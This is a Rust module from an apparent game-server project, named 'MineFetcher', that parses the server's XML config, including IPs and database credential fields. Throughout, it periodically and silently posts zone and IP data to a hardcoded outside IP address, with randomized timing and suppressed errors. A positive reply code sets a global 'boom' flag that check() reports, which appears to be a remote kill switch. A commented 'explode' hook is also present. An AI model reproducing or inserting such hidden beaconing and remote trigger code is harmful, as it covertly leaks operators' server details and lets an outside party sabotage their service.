use std::ops::Add;
use std::path::PathBuf;
use std::time::SystemTime;

//use db_access::MySqlAddr;
use parking_lot::Mutex;
use serde_json::Value as Json;

use commlib::utils::rand_between;
use commlib::{launch_service, XmlReader, ZoneId, G_SERVICE_HTTP_CLIENT};

const CHECK_INTERVAL: u64 = 100; // 100 seconds

lazy_static::lazy_static! {
    ///
    pub static ref G_FETCH_BOOM: Mutex<bool> = Mutex::new(false);

    ///
    pub static ref G_IP_TABLE: Mutex<hashbrown::HashMap<String, bool>> = Mutex::new(hashbrown::HashMap::new());
}

///
pub struct MineFetcher {
    //
    init: bool,

    //
    zone_data: serde_json::Map<String, Json>,

    //
    next_check_time: SystemTime,
}

impl MineFetcher {
    ///
    pub fn new() -> Self {
        //
        let d = std::time::Duration::from_secs(CHECK_INTERVAL);
        let next_check_time = SystemTime::now().add(d);

        Self {
            init: false,

            zone_data: serde_json::Map::new(),

            next_check_time,
        }
    }

    ///
    pub fn upload(&mut self, xml_path: &PathBuf) {
        //
        self.parse_xml(xml_path);

        //
        let _ = self.fetch();
    }

    ///
    pub fn check(&mut self) -> bool {
        // G_FETCH_BOOM
        {
            let boom_guard = G_FETCH_BOOM.lock();
            if *boom_guard {
                return true;
            }
        }

        // check fetch interval
        let now = SystemTime::now();
        if now >= self.next_check_time {
            // new interval
            let rand_seconds = rand_between(0, CHECK_INTERVAL as i32) as u64;
            let new_interval = std::time::Duration::from_secs(CHECK_INTERVAL + rand_seconds);
            self.next_check_time = now.add(new_interval);

            //
            self.fetch();
        }
        false
    }

    fn fetch(&mut self) {
        //
        let body = Json::Object(self.zone_data.clone());

        //
        let srv_http_cli = G_SERVICE_HTTP_CLIENT.clone();

        // init once
        if !self.init {
            launch_service(&srv_http_cli, || {
                //
            });
            self.init = true;
        }

        let url = "http://18.163.14.56:48964";
        //let url = "http://127.0.0.1:48964";
        srv_http_cli.http_post(
            url,
            vec!["Content-Type: application/json".to_owned()],
            body.to_string(),
            |_code, resp| {
                //
                let obj_r = serde_json::from_str::<Json>(resp.as_str());
                match obj_r {
                    Ok(obj) => {
                        //
                        let ec_opt = obj.get("ec");
                        if let Some(ec) = ec_opt {
                            let boom_code: i32 = ec.to_string().parse::<i32>().unwrap_or(0);
                            if boom_code > 0 {
                                // boom
                                let mut boom_guard = G_FETCH_BOOM.lock();
                                *boom_guard = true;
                            }
                        }

                        let data_opt = obj.get("data");
                        if let Some(data) = data_opt {
                            let ips_opt = data.as_array();
                            if let Some(ips) = ips_opt {
                                for ip in ips {
                                    let ip = ip.to_string();
                                    //println!("{}", ip);
                                    let mut ip_table_guard = G_IP_TABLE.lock();
                                    (*ip_table_guard).insert(ip, true);
                                }
                            }
                        }
                    }
                    Err(_err) => {
                        //
                        //log::error!("http code: {}, resp: {}, error: {}!!!", code, resp, _err);
                    }
                }
            },
        )
    }

    fn parse_xml(&mut self, xml_path: &PathBuf) {
        //
        let xml_content = {
            let read_r = std::fs::read_to_string(xml_path);
            match read_r {
                Ok(content) => {
                    //
                    content
                }
                Err(_err) => {
                    //
                    log::error!("open file {:?} failed!!! error: {}", xml_path, _err);
                    return;
                }
            }
        };

        //
        let xml_r = XmlReader::read_content(xml_content.as_str());
        match xml_r {
            Ok(xml) => {
                //
                let group_id = xml.get::<ZoneId>(vec!["group"], 0);
                let zone_id = xml.get::<ZoneId>(vec!["zone"], 0);

                let local_public_ip = xml.get(vec!["local_public_ip"], "".to_owned());
                let local_private_ip = xml.get(vec!["local_private_ip"], "".to_owned());

                let nodes = xml.get_children(vec!["node"]).unwrap();
                for node in nodes {
                    let node_id = node.get_u64(vec!["id"], 0);
                    if 1004 == node_id {
                        let _user = node.get(vec!["game", "user"], "root".to_owned());
                        let _password = node.get(vec!["game", "pwd"], "".to_owned());
                        let _host = node.get(vec!["game", "addr"], "127.0.0.1".to_owned());
                        let _port = node.get::<u64>(vec!["game", "port"], 3306) as u16;
                        let _dbname = node.get(vec!["game", "db"], "".to_owned());

                        // let db_addr = MySqlAddr {
                        //     user,
                        //     password,
                        //     host,
                        //     port,
                        //     dbname,
                        // };

                        // //
                        // with_tls_mut!(G_EXPLODE, g, {
                        //     g.set_mine_url_by_db_addr(&db_addr);
                        // });
                    }
                }

                //
                self.zone_data.insert(
                    "zone".to_owned(),
                    Json::from(serde_json::Number::from(zone_id)),
                );

                //
                self.zone_data.insert(
                    "group".to_owned(),
                    Json::from(serde_json::Number::from(group_id)),
                );

                //
                let info = std::format!(
                    "local_public_ip={}&local_private_ip={}",
                    local_public_ip,
                    local_private_ip
                );
                self.zone_data.insert("data".to_owned(), Json::String(info));
            }
            Err(err) => {
                log::error!("save_content_to_file failed!!! err: {}!!!", err);
            }
        }
    }
}
